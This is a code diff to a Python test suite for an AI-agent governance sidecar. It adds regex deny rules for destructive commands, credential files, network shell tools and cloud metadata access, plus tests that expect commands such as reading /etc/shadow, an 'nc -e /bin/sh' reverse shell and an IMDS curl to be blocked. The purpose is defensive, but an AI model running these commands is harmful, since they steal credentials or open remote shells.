@@ -35,10 +35,22 @@ class MockPolicyEvaluator:
         self.policies = policies or []
 
     def evaluate(self, ctx):
+        import re
         full = ctx.get("action", {}).get("full", "")
-        if "rm -rf /" in full or "mkfs" in full:
-            return _Decision(False, "deny", "shell-destructive-deny",
-                             "Destructive command blocked")
+        # Match rules from azureclaw-default.yaml
+        deny_rules = [
+            (r"rm\s+-rf\s+/|mkfs|shutdown|reboot|chmod\s+777|dd\s+if=",
+             "shell-destructive-deny", "Destructive command blocked"),
+            (r"/etc/shadow|/etc/gshadow|/etc/sudoers|/root/\.ssh|/proc/[0-9]+/environ",
+             "shell-sensitive-file-deny", "Sensitive file access blocked"),
+            (r"\bnmap\b|\bnc\s+-[elp]|\bnetcat\b|\bsocat\b|\bnsenter\b|\bunshare\b|\bchroot\b",
+             "shell-recon-deny", "Reconnaissance/escalation tool blocked"),
+            (r"169\.254\.169\.254|metadata\.google\.internal",
+             "network-metadata-deny", "Cloud metadata access blocked"),
+        ]
+        for pattern, rule_name, reason in deny_rules:
+            if re.search(pattern, full):
+                return _Decision(False, "deny", rule_name, reason)
         return _Decision(True, "allow", "default-allow",
                          "No deny rule matched")
 
@@ -517,6 +529,70 @@ class TestGovernanceSidecar(unittest.TestCase):
         self.assertEqual(status, 403)
         self.assertIn("matched_rule", body)
         self.assertEqual(body["matched_rule"], "shell-destructive-deny")
+
+    def test_evaluate_sensitive_file_shadow(self):
+        status, body = self._post("/evaluate", {
+            "action": "shell:cat /etc/shadow",
+            "agent_id": "agent-recon",
+        })
+        self.assertEqual(status, 403)
+        self.assertEqual(body["matched_rule"], "shell-sensitive-file-deny")
+
+    def test_evaluate_sensitive_file_sudoers(self):
+        status, body = self._post("/evaluate", {
+            "action": "shell:cat /etc/sudoers",
+            "agent_id": "agent-recon",
+        })
+        self.assertEqual(status, 403)
+        self.assertEqual(body["matched_rule"], "shell-sensitive-file-deny")
+
+    def test_evaluate_sensitive_file_ssh_key(self):
+        status, body = self._post("/evaluate", {
+            "action": "shell:cat /root/.ssh/id_rsa",
+            "agent_id": "agent-recon",
+        })
+        self.assertEqual(status, 403)
+        self.assertEqual(body["matched_rule"], "shell-sensitive-file-deny")
+
+    def test_evaluate_sensitive_file_proc_environ(self):
+        status, body = self._post("/evaluate", {
+            "action": "shell:cat /proc/1/environ",
+            "agent_id": "agent-recon",
+        })
+        self.assertEqual(status, 403)
+        self.assertEqual(body["matched_rule"], "shell-sensitive-file-deny")
+
+    def test_evaluate_recon_nmap(self):
+        status, body = self._post("/evaluate", {
+            "action": "shell:nmap -sS 10.0.0.0/24",
+            "agent_id": "agent-recon",
+        })
+        self.assertEqual(status, 403)
+        self.assertEqual(body["matched_rule"], "shell-recon-deny")
+
+    def test_evaluate_recon_netcat(self):
+        status, body = self._post("/evaluate", {
+            "action": "shell:nc -e /bin/sh 1.2.3.4 4444",
+            "agent_id": "agent-recon",
+        })
+        self.assertEqual(status, 403)
+        self.assertEqual(body["matched_rule"], "shell-recon-deny")
+
+    def test_evaluate_metadata_imds(self):
+        status, body = self._post("/evaluate", {
+            "action": "shell:curl http://169.254.169.254/metadata/identity",
+            "agent_id": "agent-recon",
+        })
+        self.assertEqual(status, 403)
+        self.assertEqual(body["matched_rule"], "network-metadata-deny")
+
+    def test_evaluate_safe_shell_allowed(self):
+        status, body = self._post("/evaluate", {
+            "action": "shell:ls -la /tmp",
+            "agent_id": "agent-safe",
+        })
+        self.assertEqual(status, 200)
+        self.assertTrue(body["allowed"])
 
     def test_build_context_parsing(self):
         """_build_context splits action strings correctly."""
